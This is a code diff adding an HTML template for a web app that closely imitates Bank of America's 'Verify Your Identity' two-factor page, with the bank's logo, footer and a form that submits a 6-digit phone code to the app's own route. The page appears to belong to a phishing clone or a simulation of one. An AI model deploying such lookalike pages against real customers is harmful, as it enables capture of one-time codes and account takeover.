@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Your Identity - Bank of America</title>
+    
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/custom.css') }}">
+    
+    <style>
+        body {
+            background-color: white;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        
+        .login-header {
+            background: white;
+            padding: 5px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        .login-banner {
+            background-color: #e31837;
+            color: white;
+            padding: 10px 0;
+            font-size: 1.4rem;
+            font-weight: 300;
+        }
+        
+        .login-main {
+            background-color: #f7f7f7;
+            min-height: 500px;
+            padding: 50px 0;
+        }
+        
+        .verification-section {
+            background: white;
+            padding: 30px;
+            border: 1px solid #d0d0d0;
+            border-radius: 2px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .verification-section label {
+            font-size: 0.9rem;
+            color: #666;
+            font-weight: normal;
+            margin-bottom: 6px;
+        }
+        
+        .verification-section input[type="text"] {
+            border: 1px solid #a0a0a0;
+            border-radius: 2px;
+            padding: 7px 10px;
+            font-size: 0.95rem;
+        }
+        
+        .verification-section input[type="text"]:focus {
+            border-color: var(--bank-blue);
+            outline: none;
+            box-shadow: none;
+        }
+        
+        .btn-verify {
+            background-color: #0073cf;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            padding: 7px 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        
+        .btn-verify:hover {
+            background-color: #005ea2;
+            color: white;
+        }
+        
+        .login-footer {
+            background-color: #ebebeb;
+            padding: 25px 0;
+            border-top: 1px solid #d0d0d0;
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="login-header">
+        <div class="container">
+            <div class="d-flex justify-content-between align-items-center">
+                <div class="d-flex align-items-center">
+                    <img src="{{ url_for('static', filename='bofa_color_transparent_bg_single_line.png') }}" 
+                         alt="Bank of America" 
+                         style="height: 30px; width: auto; margin-right: 30px;">
+                    <span style="color: #999; font-size: 1.05rem; font-weight: 400;">Verify Your Identity</span>
+                </div>
+                <div class="d-flex align-items-center" style="gap: 20px;">
+                    <a href="#" style="color: #666; text-decoration: none; font-size: 0.9rem;">
+                        <i class="bi bi-lock" style="font-size: 0.85rem;"></i> Secure Area
+                    </a>
+                    <a href="#" style="color: #666; text-decoration: none; font-size: 0.9rem;">En español</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Red Banner -->
+    <div class="login-banner">
+        <div class="container">
+            Verify Your Identity
+        </div>
+    </div>
+    
+    <!-- Main Verification Area -->
+    <div class="login-main">
+        <div class="container">
+            <!-- Flash Messages -->
+            {% with messages = get_flashed_messages(with_categories=true) %}
+                {% if messages %}
+                    {% for category, message in messages %}
+                        <div class="alert alert-{{ category }} alert-dismissible fade show mb-4" role="alert" style="max-width: 500px; margin: 0 auto 2rem auto;">
+                            {{ message }}
+                            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+                        </div>
+                    {% endfor %}
+                {% endif %}
+            {% endwith %}
+            
+            <div class="verification-section">
+                <h5 class="mb-3" style="font-size: 1.15rem; font-weight: 600; color: #333;">
+                    <i class="bi bi-shield-check" style="color: var(--bank-blue);"></i> 
+                    Two-Factor Authentication
+                </h5>
+                
+                <p style="font-size: 0.9rem; color: #666; margin-bottom: 1.5rem;">
+                    For your security, we've sent a verification code to the phone number ending in 
+                    <strong>******{{ user_phone[-4:] }}</strong>.
+                </p>
+                
+                <div class="alert alert-info" style="font-size: 0.875rem; margin-bottom: 1.5rem;">
+                    <i class="bi bi-info-circle"></i> 
+                    Please enter the 6-digit code to continue.
+                </div>
+                
+                <form method="POST" action="{{ url_for('login_2fa') }}">
+                    <div class="mb-3">
+                        <label for="code" class="form-label">Verification Code</label>
+                        <input type="text" class="form-control" id="code" name="code" 
+                               maxlength="6" placeholder="000000" required autofocus 
+                               pattern="[0-9]{6}" inputmode="numeric">
+                        <small class="text-muted">Enter the 6-digit code sent to your phone</small>
+                    </div>
+                    
+                    <div class="d-grid gap-2 mb-3">
+                        <button type="submit" class="btn btn-verify">
+                            <i class="bi bi-check-circle"></i> Verify
+                        </button>
+                    </div>
+                </form>
+                
+                <hr class="my-4">
+                
+                <div class="text-center">
+                    <p style="font-size: 0.875rem; color: #666; margin-bottom: 0.5rem;">Didn't receive a code?</p>
+                    <a href="#" class="text-decoration-none" style="color: #0073cf; font-size: 0.875rem;">
+                        Resend verification code
+                    </a>
+                </div>
+                
+                <div class="text-center mt-3">
+                    <a href="{{ url_for('login') }}" class="text-decoration-none" style="color: #666; font-size: 0.875rem;">
+                        <i class="bi bi-arrow-left"></i> Back to login
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <div class="login-footer">
+        <div class="container">
+            <div class="mb-2">
+                <i class="bi bi-lock"></i> <span style="color: #666; font-size: 0.9rem;">Secure area</span>
+            </div>
+            <div class="small">
+                <a href="#" class="text-muted text-decoration-none me-3">Privacy</a>
+                <a href="#" class="text-muted text-decoration-none me-3">Security</a>
+                <a href="#" class="text-muted text-decoration-none">CA Opt-Out Preference Signals Honored</a>
+            </div>
+            <div class="small text-muted mt-2">
+                Bank of America, N.A. Member FDIC. <a href="#" class="text-muted">Equal Housing Lender</a> <i class="bi bi-house-check"></i>
+                <br>© 2025 Bank of America Corporation.
+            </div>
+        </div>
+    </div>
+    
+    <!-- Bootstrap 5 JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
+
